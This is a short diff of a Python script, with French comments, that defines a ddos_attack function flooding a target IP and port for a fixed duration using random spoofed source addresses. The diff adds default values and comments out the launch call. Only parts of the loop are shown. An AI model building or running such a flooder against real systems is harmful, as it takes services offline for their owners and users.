@@ -5,7 +5,7 @@ import time
 def generate_random_ip():
     return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 
-def ddos_attack(target_ip, target_port, duration):
+def ddos_attack(target_ip, target_port=80, duration=60):
     packet_count = 0
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -25,4 +25,4 @@ target_port = 80  # Remplacer par le port de la cible
 duration = 60  # Durée de l'attaque en secondes
 
 # Lancer l'attaque DDoS simulée
-ddos_attack(target_ip, target_port, duration)
+#ddos_attack(target_ip, target_port, duration)
